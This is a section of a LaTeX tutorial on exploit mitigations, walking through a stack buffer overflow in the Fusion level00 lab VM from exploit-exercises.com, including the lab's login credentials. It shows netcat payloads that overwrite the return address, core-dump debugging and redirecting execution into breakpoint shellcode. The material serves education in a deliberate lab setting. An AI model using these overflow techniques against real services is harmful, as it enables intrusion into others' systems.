\subsection{ASLR}

One of the earliest responses to exploits is Address Space Layout Randomization (ASLR).
Introduced in 2001 in PaX, the goal of ASLR is to make successful exploitation
of a vulnerability more difficult by introducing entropy into addresses
of the stack, heap, functions, and shared objects. If we re-examine
the work we've done so far, we'll notice that we're pretty reliant
on knowing precisely where various things are. For example, to get code
execution we need to both store our shellcode somewhere in the
process' memory space, and know the address it is stored at, so
we can jump to it and redirect execution While we can still
rely on there being a fixed number of bytes from the beginning of
a vulnerable buffer until the stored return address, we'll quickly
notice that some things are moved around, and it's no longer
sufficient to simply overwrite the return pointer with the same constant.

As a demonstration, let's begin with a slightly more complicated, but
still doable, stack-based buffer overflow. This is still without
any protections, so it should be fairly straightforward. This is
\texttt{level00} on the \texttt{fusion} virtual machine from exploit-exercises.com.
This is designed to pick up where protostar left off, and introduce
more advanced concepts, such as exploit mitigations. We'll leave
further vm-specific information for later.

First, the scenario. Following is the important bits of the source 
from exploit-exercises.com:

\lstinputlisting[language=C]{stack/fusion_level00.c}

It's a bit more complicated, but not too bad once we get down to it.
Basically, this program hosts a psuedo-http server. It's not
actually http-compliant at all, but at least forces you to try
and pretend. It listens for connections on a socket, and will
helpfully tell visitors the address of its internal buffer.
After a read from the socket it will parse the input, making
sure it at least sort of looks like an http GET request, then
pass a portion to the \texttt{fix\_path} function. This is where 
things get interesting, as we see that this function
has a 128-byte buffer that it calls a \texttt{strcpy} on! This
is bad. Alright, so we think we've found a vulnerability. Let's 
start experimenting. We can find this program listening on
port 20000 of the virtual machine. using \texttt{fusion}:\texttt{godmode}
to log in (and remembering root's password is also \texttt{godmode}), we
can take advantage of core dumps in reversing this exploit.
First, let's send 200 bytes. Since this has a decent chance of 
overwriting the return pointer, we'll pattern it to help us 
determine memory layout. This can be done with a simple python script
and netcat.

\begin{lstlisting}
buf = []
for i in range(0x41,0x4c):
			buf.append(chr(i)*20)
			print ''.join(buf)
\end{lstlisting}

Using the pre-3.0 python on fusion, we take 20 copies of the first
10 letters each, and append them all together. This gives a nice, 
simple buffer we can just copy/paste:
\begin{lstlisting}
fusion@fusion:~/level00\$ python buf.py 
AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHIIIIIIIIIIIIIIIIIIIIJJJJJJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKKKKK
\end{lstlisting}

So, testing is as simple as sending a properly formatted buffer with netcat,
and examining the core dump \texttt{/core}. If this file exists already,
you should delete it with \texttt{rm} before making another. Of course, we'll
also want to execute \texttt{ulimit -c unilimited} to allow coredumps unilmited
in size

\begin{lstlisting}
fusion@fusion:~/level00\$ nc localhost 20000
[debug] buffer is at 0xbffff8f8 :-)
GET AAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBCCCCCCCCCCCCCCCCCCCCDDDDDDDDDDDDDDDDDDDDEEEEEEEEEEEEEEEEEEEEFFFFFFFFFFFFFFFFFFFFGGGGGGGGGGGGGGGGGGGGHHHHHHHHHHHHHHHHHHHHIIIIIIIIIIIIIIIIIIIIJJJJJJJJJJJJJJJJJJJJKKKKKKKKKKKKKKKKKKKK HTTP/1.1
fusion@fusion:~/level00\$ sudo gdb -q --core /core
[New LWP 3042]
Core was generated by `/opt/fusion/bin/level00'.
Program terminated with signal 11, Segmentation fault.
#0  0x48484847 in ?? ()
\end{lstlisting}

Excellent! the return pointer happened to be directly on a boundary.
Remembering how the buffer was crafted (increasing order), and the
little-endianness of our intel machine, then we know that
the return address is directly where ``\texttt{GHHH}" is in our buffer.
To further verify this, we can craft another buffer with a specific value where
we expect the return pointer to be, send it to the server, then check
the coredump. Remember that we'll need to remove the coredump \texttt{/core}
before crashing the program again, as otherwise it won't be overwritten.

\begin{lstlisting}
fusion@fusion:~\$ sudo rm /core
fusion@fusion:~\$ python -c 'print "GET " + "A"*139 + "\xf3\xf2\xf1\xf0" + " HTTP/1.1\n"' | nc localhost 20000
[debug] buffer is at 0xbffff8f8 :-)
\end{lstlisting}

Here, we place the bytes \texttt{0xf0f1f2f3} where we expect the return pointer to be;
139 bytes after the beginning of our ``path" buffer. Thus, if this
is the right location, we'll see that our coredump will have been
generated after a segfault trying to access \texttt{0xf0f1f2f3}.
As we can see, this is indeed the case:

\begin{lstlisting}
fusion@fusion:~\$ sudo gdb -q --core /core
[New LWP 1901]
Core was generated by `/opt/fusion/bin/level00'.
Program terminated with signal 11, Segmentation fault.
#0  0xf0f1f2f3 in ?? ()
\end{lstlisting}

So, we can quite easily crash the program, and by now we know the
next step is to redirect execution somewhere beneficial, such as
to some place in memory where we've stored some shellcode. However, 
the current portion of the buffer we're using is passed to
a \texttt{realpath(path, resolved)} function on line 7 of 
the source, which is in the function where our actual overflow happens. Playing
it safe, we'll assume this function is valid in checking that a
given string could possibly represent a file, meaning we probably
won't get away with putting non-printable characters in here, 
something very difficult to avoid when trying to represent instructions.
It is technically possible to construct valid shellcode using
only printable/readable characters\footnote{http://www.blackhatlibrary.net/Ascii\_shellcode},
but this is definitely out of the scope of this paper.

Going back over the source, we do notice an opportunity. The
\texttt{parse\_http\_request} function receives our full buffer,
checks psuedo-http compliance, then passes a portion of our
full buffer to the vulnerable \texttt{fix\_path} function. We 
already know that the vulnerable function's buffer is only
128 bytes, but the initial buffer we are placed in is a much
larger 1024 bytes. So, could we possibly places bytes after
the ``HTTP/1.1" portion of our buffer? Examining the compliance-checking
code on line 26, we see that our buffer is compared to make
sure it contains exactly ``HTTP/1.1", but as it only checks
8 characters, we could technically end our buffer with whatever
we want, so long as it begins with ``HTTP/1.1". Also worth noting
here is that the \texttt{read} function may
possibly read null bytes, which could make string processing 
interesting\footnote{such as when you use functions on binary data which assume it is a string: http://wiibrew.org/wiki/Signing\_bug},
but in this case likely won't cause problems.

So, if we were to place some bytes after ``HTTP/1.1", then not only
will this not ruin our psuedo-http compliance, but these bytes will
not be checked in any way, as our overflow bytes passed to \texttt{realpath(path, resolved)} were.
Let's explore this with the magical byte \texttt{0xcc}. According to
the Intel Manuals\footnote{TODO: add reference to intel manuals here}, this
is for the \texttt{INT 3} instruction, used by debuggers to set breakpoints.
To redirect execution to our test shellcode, we'll need to calculate it.
With some simple algebra, we simply add the number of characters
we've written to our buffer to the buffer's starting address. So, 
including the ``GET", overflow buffer and ``HTTP/1.1\textbackslash n", we have 157
bytes, giving a target address of \texttt{0xbffff8f8+157 = 0xbffff995},
assuming we jump to the byte immediately following the ``HTTP/1.1\textbackslash n".

\begin{lstlisting}
fusion@fusion:~/level00\$ python -c 'print "GET " + "A"*139 + "\x95\xf9\xff\xbf" + " HTTP/1.1\n" + "\xcc"*2' | nc localhost 20000
[debug] buffer is at 0xbffff8f8 :-)
fusion@fusion:~/level00\$ sudo rm /core
fusion@fusion:~/level00\$ sudo gdb -q --core /core
[New LWP 2499]
Core was generated by `/opt/fusion/bin/level00'.
Program terminated with signal 5, Trace/breakpoint trap.
#0  0xbffff996 in ?? ()
\end{lstlisting}

Excellent! Noticing that we crashed because of an unhandled
breakpoint trap, and that the instruction pointer is immediately
after where we redirected to, we know that we have succesfully
redirected execution to our payload. All that is left is to
create a suitable payload for our purposes, and we have
a full exploit. 

This is nice, but nothing here strictly relates to ASLR. We
had some extra work in sending a buffer over the network while satisfying
certain conditions, but this was hardly a problem. More 
importantly, the address of the buffer, which is just given
to us, does not change between executions as it would under ASLR.
This is why we move to the next challenge, \texttt{level01}. 
It is identical to the previous one, but with a form of ASLR, and 
won't give us hints.

